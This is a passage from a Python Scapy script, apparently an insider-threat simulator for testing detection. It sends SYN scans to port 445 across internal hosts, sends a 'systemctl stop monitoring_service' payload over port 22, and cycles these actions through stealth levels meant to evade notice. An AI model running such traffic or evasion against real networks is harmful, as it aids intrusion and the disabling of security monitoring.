        # Targeting fewer devices with intervals
        for target in random.sample(internal_targets, 10):
            packet = IP(src=LOCAL_IP, dst=target) / TCP(sport=random.randint(1024, 65535), dport=445, flags="S")
            send(packet, verbose=False)
            time.sleep(random.uniform(1, 2))
    elif level == 3:
        # Targeting a single device
        target = random.choice(internal_targets)
        packet = IP(src=LOCAL_IP, dst=target) / TCP(sport=random.randint(1024, 65535), dport=445, flags="S")
        send(packet, verbose=False)
    logging.info("Lateral movement completed.")

def simulate_security_circumvention(level):
    """
    Simulates attempts to disable security systems.
    """
    logging.info(f"Simulating security circumvention at level {level}...")
    if level == 1:
        # Obvious command
        payload = "sudo systemctl stop monitoring_service"
    elif level == 2:
        # Encrypted payload
        payload = "ENCRYPTED_STOP_COMMAND".encode("utf-8")
    elif level == 3:
        # Mimicking legitimate traffic
        payload = "GET /status HTTP/1.1\r\nHost: monitoring_service\r\n\r\n"
    packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=22) / Raw(load=payload)
    send(packet, verbose=False)
    logging.info("Security circumvention completed.")

def main():
    """
    Main function to sequentially run all simulations with varying levels of stealth.
    """
    actions = [
        simulate_reconnaissance,
        simulate_unusual_access,
        simulate_data_exfiltration,
        simulate_anomaly_detection_trigger,
        simulate_lateral_movement,
        simulate_security_circumvention,
    ]

    logging.info("Starting insider threat simulation with varying levels of stealth...")
    level = 1
    for _ in range(10):  # Run for 10 iterations (10 minutes total)
        for action in actions:
            action(level)
            time.sleep(60)  # Wait 1 minute between actions
        level = (level % 3) + 1  # Cycle through levels (1 -> 2 -> 3)

    logging.info("Insider threat simulation completed.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Simulation interrupted.")